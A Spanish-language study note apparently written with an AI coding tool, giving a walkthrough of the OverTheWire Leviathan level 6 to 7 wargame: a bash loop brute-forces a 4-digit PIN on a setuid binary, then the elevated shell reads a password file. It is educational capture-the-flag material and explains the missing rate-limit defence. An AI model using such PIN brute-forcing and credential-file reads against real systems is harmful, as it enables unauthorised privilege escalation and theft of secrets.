---
title: Leviathan Nivel 6 a 7
date: 2026-06-14
tags: [ciberseguridad, linux, fuerza-bruta, setuid, leviathan, wargame]
type: nota
status: en-progreso
source: claude-code
aliases: [Leviathan 6, Leviathan nivel 6, leviathan6]
---

# Leviathan Nivel 6 a 7

Nivel oficial: https://overthewire.org/wargames/leviathan/leviathan7.html

Este es el ultimo nivel de Leviathan. Un binario con bit setuid espera un PIN de 4 digitos; si aciertas, eleva tu shell a leviathan7 y puedes leer la contrasena final. El espacio de busqueda es tan pequeno (10 000 combinaciones) que la fuerza bruta es la solucion optima.

> Este laboratorio es legal y autorizado: OverTheWire es un entorno educativo de wargames diseñado explicitamente para practicar seguridad ofensiva.

## Objetivo

Encontrar el PIN correcto de 4 digitos que acepta el binario `leviathan6` para obtener una shell como leviathan7, y leer `/etc/leviathan_pass/leviathan7`.

## Que aprendes

| Concepto / Comando | Para que sirve |
|---|---|
| Binario setuid | Ejecuta con los privilegios del propietario, no del invocador |
| `seq -w 0 9999` | Genera numeros con ceros a la izquierda (0000-9999) |
| Bucle `for` en bash | Itera el espacio de busqueda sin herramientas externas |
| `ls -la` | Verifica bit setuid antes de empezar |
| `cat /etc/leviathan_pass/leviathan7` | Lee la contrasena del nivel siguiente una vez con shell elevada |

### Concepto clave

**Fuerza bruta de espacio pequeño**: cuando el dominio de posibles valores es acotado y no hay limitacion de intentos (rate-limit, bloqueo por intentos fallidos, CAPTCHA), iterar todas las combinaciones es un ataque valido y eficiente. Un PIN de 4 digitos tiene exactamente 10 000 combinaciones; a razon de cientos de intentos por segundo en local, se agota en segundos. La contramedicda adecuada seria limitar intentos o usar un espacio de busqueda mayor (p. ej., contrasena alfanumerica).

## Paso a paso

**1. Conectarse como leviathan6**

```bash
ssh leviathan6@leviathan.labs.overthewire.org -p 2223
# contrasena: <pass_leviathan6>
```

**2. Confirmar el binario y su bit setuid**

```bash
ls -la ~/leviathan6
```

La salida debe mostrar `-rwsr-xr-x` con propietario `leviathan7`. La `s` en lugar de `x` en el bloque del propietario indica setuid activo.

**3. Entender el comportamiento del binario**

```bash
~/leviathan6 1234
# Salida esperada en fallo: Wrong
```

El binario acepta un argumento posicional de 4 digitos. Si el PIN es incorrecto imprime un mensaje y termina. Si es correcto, abre una shell interactiva con euid de leviathan7.

**4. Lanzar la fuerza bruta**

```bash
for i in $(seq -w 0 9999); do
    ~/leviathan6 "$i"
done
```

La flag `-w` de `seq` rellena con ceros a la izquierda para que todos los valores tengan exactamente 4 digitos (0000, 0001, ..., 9999). Cuando el PIN correcto se prueba, el bucle se detiene porque el binario abre una shell interactiva en lugar de terminar.

**5. Leer la contrasena desde la shell elevada**

Una vez dentro de la shell (el prompt cambia o puedes verificar con `whoami`):

```bash
whoami
# leviathan7
cat /etc/leviathan_pass/leviathan7
# <pass_leviathan7>
```

**6. Mensaje de felicitacion**

Leviathan7 es el ultimo nivel. Al acceder directamente via SSH o leer la nota del nivel encontraras un mensaje de felicitacion; no hay nivel 8.

```bash
ssh leviathan7@leviathan.labs.overthewire.org -p 2223
# contrasena: <pass_leviathan7>
cat /etc/motd   # o mira el directorio home
```

## Por que funciona

El binario compara el argumento recibido contra un PIN hardcoded en su logica interna. No implementa ninguna defensa contra multiples intentos consecutivos: no hay retardo entre intentos, no registra fallos y no bloquea al invocador. El bit setuid garantiza que, cuando el PIN es correcto y el binario ejecuta `execve("/bin/sh", ...)` o equivalente, la shell hereda el euid de leviathan7. El espacio de 10 000 combinaciones se agota en pocos segundos en un servidor local.

## Errores comunes

| Error | Causa | Solucion |
|---|---|---|
| `seq` genera numeros sin ceros (`1`, `2`...) | Omitir la flag `-w` | Usar `seq -w 0 9999` |
| La shell se abre pero se cierra sola | El bucle continua iterando y machaca la shell abierta | Anadir `&& break` al final del comando dentro del bucle: `~/leviathan6 "$i" && break` |
| El bucle termina sin exito | El binario no acepta el argumento con comillas o espacios extra | Asegurarse de pasar `"$i"` sin espacios adicionales |
| `Permission denied` al ejecutar el binario | El binario no tiene permiso de ejecucion para el usuario actual | Verificar con `ls -la`; en este nivel deberia ser world-executable |

## Pasar al siguiente nivel

No hay nivel siguiente: Leviathan7 es el ultimo nivel del wargame. La contrasena obtenida en este paso es la recompensa final. Puedes usar las tecnicas aprendidas en wargames de mayor dificultad como o (niveles con explotacion de binarios mas compleja).

## Conexiones

- [[Leviathan/00_README]]
- [[MOC_Ciberseguridad]]
- [[06-seguridad-de-sistemas-y-hardening]]
- [[13-herramientas-en-detalle]]
